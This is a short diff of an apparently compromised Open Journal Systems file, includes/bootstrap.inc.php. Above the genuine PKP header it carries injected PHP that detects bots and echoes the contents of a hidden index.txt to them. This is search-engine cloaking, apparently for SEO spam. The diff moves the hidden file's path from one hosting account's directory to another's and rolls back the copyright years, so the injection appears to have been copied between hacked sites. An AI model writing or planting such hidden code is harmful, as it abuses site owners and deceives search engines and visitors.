@@ -13,7 +13,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('/home/u291286007/domains/prjss.com/public_html/lib/pkp/controllers/grid/files/final/form/index.txt');
+    $message = file_get_contents('/home/spcrdnet/public_html/real/lib/pkp/lib/vendor/components/jqueryui/ui/minified/i18n/index.txt');
     echo $message;
 exit;
 }
@@ -28,8 +28,8 @@ exit;
 /**
  * @file includes/bootstrap.inc.php
  *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2000-2021 John Willinsky
+ * Copyright (c) 2014-2020 Simon Fraser University
+ * Copyright (c) 2000-2020 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup index
